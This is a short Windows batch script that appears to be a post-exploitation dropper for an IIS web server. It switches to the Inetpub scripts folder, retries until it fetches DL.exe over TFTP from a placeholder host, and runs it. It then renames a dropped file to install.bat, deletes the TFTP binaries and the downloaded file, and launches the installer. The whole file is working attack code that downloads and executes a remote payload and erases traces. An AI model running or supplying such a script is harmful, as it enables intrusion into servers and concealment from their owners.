@echo off
cd \Inetpub\scripts
startDL:
tftp.exe -i a.b.c.d get DL.exe
if not exist DL.exe goto startDL
start /w DL.exe
ren 00.D install.bat
attrib TFTP* -r
attrib DL.exe -r
del TFTP*
del DL.exe
install.bat %1
exit
